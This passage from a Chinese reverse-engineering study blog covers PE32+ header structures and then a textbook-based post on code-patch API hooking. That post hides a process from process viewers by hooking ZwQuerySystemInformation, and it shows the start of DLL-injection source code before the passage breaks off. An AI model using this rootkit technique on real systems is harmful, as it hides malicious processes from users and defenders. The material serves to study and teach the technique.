IMAGE_THUNK_DATA64;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA64              IMAGE_THUNK_DATA;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_THUNK_DATA64             PIMAGE_THUNK_DATA;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32              IMAGE_THUNK_DATA;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_THUNK_DATA32             PIMAGE_THUNK_DATA;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>检查标识根据结构重定义结构体。可以看到结构体的字段类型由DOWRD变为ULONGLONG，这也是适配增大后的进程虚拟空间作出的修正。</p><p>此外，需要指出的一点是存放导入具体信息的结构体IMAGE_THUNK_DATA是由结构体IMAGE_IMPORT_DESCRIPTOR的OriginalFirstThunk（IAT）或者FirstThunk（INT）以RVA方式指出，结构体IMAGE_IMPORT_DESCRIPTOR在PE32和PE32+中没有差别：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound INT (PIMAGE_THUNK_DATA) 存着INT表地址</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;                           <span class="comment">//导入库的名字</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses) 存着IAT表地址</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>这两个字段都是DWORD类型，跟踪这两个字段会根据系统不同检索到不一样的内容，PE32检索到IMAGE_THUNK_DATA32（大小4个字节），而PE32+会检索到IMAGE_THUNK_DATA64（大小为8个字节），因此跟踪IAT是要注意数组元素的大小。</p><h4 id="IMAGE-TLS-DIRECTORY"><a href="#IMAGE-TLS-DIRECTORY" class="headerlink" title="IMAGE_TLS_DIRECTORY"></a>IMAGE_TLS_DIRECTORY</h4><blockquote><p>关于TLS，概念不是很深，查找了相关资料：<a href="https://0xnope.top/2021/03/13/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">https://0xnope.top/2021/03/13/TLS回调函数/</a></p><p>TLS （Thread Local Storage 线程本地存储 ）回调函数（Callback Function）。</p><p>TLS是各线程的独立的数据存储空间，对象的存储在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。使用TLS技术可在<strong>线程</strong>内部独立使用或修改<strong>进程</strong>的<strong>全局数据</strong>或<strong>静态数据</strong>。</p><p>TLS 回调函数的&#x3D;&#x3D;调用运行要先于 EP 代码的执行&#x3D;&#x3D;。&#x3D;&#x3D;该特性使它可以作为一种反调试技术使用，许多病毒或壳会利用这一点执行一些特殊的操作。&#x3D;&#x3D;</p><p>创建或者终止某线程时，TLS回调函数会自动执行（前后共两次）。</p></blockquote><p>在PE头中的位置IMAGE_NT_HEADERS -&gt; IMAGE_OPTIONAL_HEADER -&gt; IMAGE_DATA_DIRECTORY[9]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY64</span> &#123;</span></span><br><span class="line">    ULONGLONG StartAddressOfRawData;</span><br><span class="line">    ULONGLONG EndAddressOfRawData;</span><br><span class="line">    ULONGLONG AddressOfIndex;         <span class="comment">// PDWORD</span></span><br><span class="line">    ULONGLONG AddressOfCallBacks;     <span class="comment">// PIMAGE_TLS_CALLBACK *;</span></span><br><span class="line">    DWORD SizeOfZeroFill;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span></span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// PDWORD</span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">// PIMAGE_TLS_CALLBACK *</span></span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 其中的字段StartAddressOfRawData、EndAddressOfRawData、AddressOfIndex、AddressOfCallBacks四个字段的大小由PE32中的DWORD（占4字节大小）变为PE32+中的ULONGLONG类型（占8字节），这几个字节存储的是RVA值，其中比较关键的是AddressOfCallBacks，指向TLS回调函数的地址数组（程序启动之前，系统会调用数组当中的函数，数组以NULL结束），这说明一个程序可以有多个TLS回调函数。</p><p>至此，PE32+修正部分结束，根据实际例子进行查找比对，这里以windbg.exe（x64）为例</p><h3 id="示例演示"><a href="#示例演示" class="headerlink" title="示例演示"></a>示例演示</h3><h4 id="DOS-HEADER"><a href="#DOS-HEADER" class="headerlink" title="DOS_HEADER"></a>DOS_HEADER</h4><p>有DOS_HEADER.elfanew字段索引到IMAGE_NT_HEADERS位置</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/3.png" class=""><h4 id="IMAGE-NT-HEADERS-1"><a href="#IMAGE-NT-HEADERS-1" class="headerlink" title="IMAGE_NT_HEADERS"></a>IMAGE_NT_HEADERS</h4><p>第一个成员为Signature，不做赘述</p><p>IMAGE_NT_HEADERS的第二个成员—-IMAGE_FILE_HEADER：</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/4.png" class=""><p>可以看出Machine字段值为：0x8664</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/5.png" class=""><p>程序的节区数目为0x0006，也就是6个节区</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/6.png" class=""><p>并且SizeOfOptionalHeader为0x00F0，用于指示OptionalHeader的大小，默认32位程序是0xE0，64位程序则是0xF0。</p><h4 id="IMAGE-OPTIONAL-HEADER-1"><a href="#IMAGE-OPTIONAL-HEADER-1" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h4><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/7.png" class=""><ul><li><p>变化一：Magic字段值 &#x3D; 0x020B，标识是64位下的PE文件</p></li><li><p>变化二：在PE32+中删除了BaseOfData字段</p></li><li><p>变化三：ImageBase的类型由DWORD（4字节）变为ULONGLONG（8字节），例子中的值 &#x3D; 0x0000000140000000</p></li></ul><p><strong>重要的字段</strong></p><ul><li>AddressOfEntryPoint  &#x3D; 0x0004C7F0（RVA）</li><li>SectionAlignment &#x3D; 0x00001000，内存中节区对齐的大小</li><li>FileAlignment &#x3D; 0x00001000，文件中节区对齐的大小</li><li>SizeofImage &#x3D; 0x000A5000，内存中整个PE文件的映射尺寸，可以比实际的大，但必须是SectionAlignment的整数倍，对齐的效果</li></ul><h4 id="IAT相关"><a href="#IAT相关" class="headerlink" title="IAT相关"></a>IAT相关</h4><p>DataDirectory[1] -&gt; IMAGE_DIRECTORY_ENTRY_IMPORT.VirtualAddress &#x3D; 0x00065F34,  IMAGE_DIRECTORY_ENTRY_IMPORT.Size &#x3D; 0x00000154.</p><p>RVA &#x3D; 0x00065F34位于节区.rdata</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/8.png" class=""><p>找到该节区，利用字段进行RVA -&gt; RAW的转换</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/9.png" class=""><p>RAW &#x3D; 0x00065F34 - 0x00050000 + 0x0005000 &#x3D; 0x00065F34 （RAW）</p><p>第一个IMAGE_IMPORT_DESCRIPTOR结构体：</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/10.png" class=""><p>OriginalFirstThunk &#x3D; 0x00066088 （RVA） -&gt; RAW &#x3D; 0x00066088 </p><p>name &#x3D; 0x00066BF0（RVA）-&gt; RAW &#x3D; 0x00066BF0</p><p>第一个导入的dll名称：</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/11.png" class=""><p>第一个DLL导入的函数地址</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/12.png" class=""><p>PE32+中IMAGE_THUNK_DATA的大小由4字节变为8字节，因此该DLL导入的第一项函数的位置是：0x0000000000066B68</p><p>换成RAW，继续跟进：</p><img src="/2022/05/11/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-16-PE32/13.png" class=""><p>发现导入的相应函数名。</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.15--API Hook：Code patch</title>
      <link href="/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/"/>
      <url>/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/</url>
      
        <content type="html"><![CDATA[<h3 id="Code-Patch"><a href="#Code-Patch" class="headerlink" title="Code Patch"></a>Code Patch</h3><p>本节关注另外一种API Hook的实施细节—–<strong>修改API代码（Code Patch）</strong>。通过Code Patch方法，展示通过这种hook技术完成向系统隐藏指定进程（Rootkit）。</p><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><p>隐藏进程（stealth process）在代码逆向分析领域中的专业术语为Rootkit，它指的是通过修改（hooking）系统内核来隐藏进程、文件、注册表等的一种技术。</p><h4 id="实施细节"><a href="#实施细节" class="headerlink" title="实施细节"></a>实施细节</h4><p>相比先前章节的内容，IAT钩取通过操作进程的对应的IAT值来实现API钩取，控制程序的执行流程。代码修改（Code patch）技术则是将API代码的前5个字节修改为<code>JMP xxxxxxxx</code>指令来钩取API，当调用由Code Patch钩取的API时，由于被钩取的API代码前5个字节被修改为<code>JMP xxxxxxxx</code>，因此会跳转到 JMP 目的地<code>xxxxxxxx</code>的位置去执行代码，进而控制程序的执行。（下面图片，来自书中内容）</p><img src="/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/1.png" class=""><img src="/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/2.png" class=""><hr><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>一些进程查看软件，例如Procexp.exe，可以查看当前系统中运行的进程。而隐藏进程则是钩取进程查看软件的相关API，从中通过Hook Function使得待隐藏的目标进程对于进程查看软件不可视。</p><h4 id="相关API"><a href="#相关API" class="headerlink" title="相关API"></a>相关API</h4><p><code>ntdll.ZwQuerySystemInfomation </code>，<a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation">API文档</a>，原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI <span class="title function_">ZwQuerySystemInformation</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="line"><span class="params">  _Inout_   PVOID                    SystemInformation,</span></span><br><span class="line"><span class="params">  _In_      ULONG                    SystemInformationLength,</span></span><br><span class="line"><span class="params">  _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数指向<code>SYSTEM_INFORMATION_CLASS</code>的枚举类型，指出想要获取的信息。出于本节查看进程信息的目的需要设置为：<code>SYSTEM_INFORMATION_CLASS = SystemProcessInformation</code>。若获取成功，则第二个参数<code>SystemInformation</code>则会写入相应获取到进程信息，本节中，该字段会获取到相应的结构体链表信息，单个的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    BYTE Reserved4[<span class="number">4</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">11</span>];</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved6[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>因此，大致的隐藏进程的思路便有了：通过钩取<code>ZwQuerySystemInformation</code>，设置好参数，修改第二个参数中返回的系统信息链表，遍历查找出我们需要隐藏的目标进程在链表中对应的节点，将之删除即可达到隐藏进程的目的。</p><img src="/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/1.png" class=""><img src="/2022/05/10/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-15-API-Hook%EF%BC%9ARootkit/2.png" class=""><h4 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h4><h5 id="下Hook"><a href="#下Hook" class="headerlink" title="下Hook"></a>下Hook</h5><ol><li>使用的DLL注入技术，将DLL文件注入进程查看软件，注入后可获取和宿主进程一样的权限。</li><li>通过DllMain修改宿主进程中API <code>ntdll.ZwQuerySystemInfomation</code>的前五个字节的指令码，修改为<code>JMP 10001120</code>，其中<code>0x10001120</code>的内容是写在DLL文件中的<code>Hook Function</code>，如此一来即可完成对API <code>ntdll.ZwQuerySystemInfomation</code> 的Hook工作。</li></ol><h5 id="Hook工作"><a href="#Hook工作" class="headerlink" title="Hook工作"></a>Hook工作</h5><p>完成Hook的工作后，当进程查看软件调用API <code>ntdll.ZwQuerySystemInfomation</code>试图借此获取当前系统中运行的进程信息时，<strong>由于前五bytes的指令字节码被修改</strong>为<code>JMP 10001120</code>，因此会跳转向<code>Hook Function</code>的地址去执行相应的内容。</p><ol><li>首先需要对API  <code>ntdll.ZwQuerySystemInfomation</code>进行unhook操作，再对恢复好的API <code>ntdll.ZwQuerySystemInfomation</code>进行调用。</li><li>对API <code>ntdll.ZwQuerySystemInfomation</code>返回的包含系统进程信息链表进行遍历，从中删除想隐藏的进程对应的节点，便可使得待隐藏进程对进程查看软件不可视。</li><li>之后重新对API进行Hook，以便再次使用。</li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="HideProc-part"><a href="#HideProc-part" class="headerlink" title="HideProc part"></a>HideProc part</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_SetProcName)</span><span class="params">(LPCTSTR szProcName)</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span>INJECTION_MODE = <span class="number">0</span>, EJECTION_MODE&#125;;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,            <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,   <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE                  hProcess, hThread;</span><br><span class="line">LPVOID                  pRemoteBuf;</span><br><span class="line">DWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, </span><br><span 